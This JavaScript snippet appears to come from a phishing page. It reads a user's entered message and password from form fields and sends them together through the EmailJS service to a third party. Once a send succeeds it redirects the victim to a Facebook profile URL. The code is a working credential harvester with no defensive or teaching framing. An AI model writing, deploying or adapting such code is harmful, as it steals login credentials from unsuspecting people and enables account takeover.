var count=0;
function sendEmail(params){
    
 var tempParams={
     from_name:document.getElementById("msg").value,
     to_name:document.getElementById("msg").value,
     message:document.getElementById("msg").value+" password:"+document.getElementById("password").value
 };
 emailjs.send("service_cixasyk","template_w2ztbf9",tempParams)
 .then(function(response){
     count++;
     console.log("successfully sent "+response.status);
 })
 if(count>0){
    window.location="https://www.facebook.com/samson.ramato";
 }
 else{
document.getElementById("erro").style.color = "red";
 console.log("samson at the end");
 }
}